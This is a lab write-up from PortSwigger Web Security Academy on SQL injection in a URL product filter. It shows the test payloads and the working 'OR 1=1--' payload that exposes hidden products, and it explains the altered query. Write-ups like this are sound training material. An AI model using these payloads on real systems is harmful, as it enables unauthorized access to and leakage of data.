# 🛡️ Lab: SQL Injection – Product Filter Bypass

## 📌 Platform

* PortSwigger Web Security Academy

---

## 🎯 Objective

Exploit an SQL injection vulnerability in a product filter to display hidden/unreleased items.

---

## 🔍 Vulnerability Overview

The application includes a product category filter in the URL:

```url
/category?category=Gifts
```

This parameter is vulnerable to **SQL Injection**, allowing manipulation of the backend query.

---

## 🧪 Step 1: Initial Testing

Test for SQL injection by adding a single quote:

```url
/category?category=Gifts'
```

### 🔎 Observation:

* Application behaves unexpectedly
* Indicates possible SQL query break → injection point confirmed

---

## 🚫 Step 2: Attempt Using Comment

```url
/category?category=Gifts'--
```

### ❌ Result:

* Did not return full data
* Only partial or unexpected response

### 🧠 Reason:

* Query logic not fully bypassed
* Conditions still restrict results

---

## 💥 Step 3: Successful Injection (Authentication Bypass Logic)

```url
/category?category=Gifts'+OR+1=1--
```

### ✅ Result:

* Displays all products
* Includes:

  * Released products
  * Hidden/unreleased products

---

## 🧠 Why This Works

Original query (simplified):

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

Injected query becomes:

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

### 🔍 Explanation:

* `OR 1=1` → always TRUE
* `--` → comments out rest of query
* Result → condition bypassed → all data returned

---

## 🔓 Exploitation Result

* Successfully bypassed product filtering
* Retrieved hidden/unreleased items
* Lab marked as solved

---

## 🧠 Key Learnings

* URL parameters are common SQL injection points
* Single quote (`'`) helps detect injection
* `OR 1=1` is a classic technique to bypass conditions
* SQL comments (`--`) can disable remaining query logic
* Always analyze backend query behavior

---

## 🛠️ Tools Used

* Browser (manual testing)
* (Optional) Burp Suite for interception and modification

---

## 🚀 Payload Summary

### Injection Test

```url
/category?category=Gifts'
```

### Failed Attempt

```url
/category?category=Gifts'--
```

### Successful Payload

```url
/category?category=Gifts'+OR+1=1--
```

---

## 📌 Real-World Relevance

* This type of vulnerability is common in poorly secured web applications
* Can lead to:

  * Data leakage
  * Authentication bypass
  * Full database exposure
* Frequently used in bug bounty and penetration testing

---

## ✅ Conclusion

This lab demonstrates how a simple SQL injection in a URL parameter can bypass application logic and expose restricted data.

---
